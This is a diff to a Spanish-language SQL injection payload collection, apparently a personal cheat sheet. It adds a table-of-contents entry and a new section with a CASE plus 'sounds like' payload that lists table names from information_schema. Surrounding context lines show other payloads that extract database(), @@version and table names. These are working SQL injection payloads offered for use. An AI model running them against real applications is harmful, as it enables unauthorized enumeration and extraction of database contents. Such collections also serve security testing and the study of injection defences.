@@ -51,6 +51,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
         * [Sql inyection payload usando upper + reverse + right + sounds like para extraer información](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like-para-extraer-información)
         * [Sql inyection usando elt, doble Reverse, hex y unhex](#Sql-inyection-usando-elt,-doble-Reverse,-hex-y-unhex)
         * [Sql inyection case](#Sql-inyection-case)
+        * [Sql inyection case y sounds like](#Sql-inyection-case-y-sounds-like)
         * [SQL IF Function](#SQL-IF-Function)
         * [SQL IFNULL](#SQL-IFNULL)
         * [SQL NULLIF](#SQL-NULLIF)
@@ -945,6 +946,13 @@ SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>
 SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
 
 SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
+```
+
+### Sql inyection case y sounds like
+
+```
+CASE table_type WHEN 'BASE Table' THEN table_name END from information_Schema.tables where table_schema sounds like schema()
+
 ```
 
 ### SQL IF Function
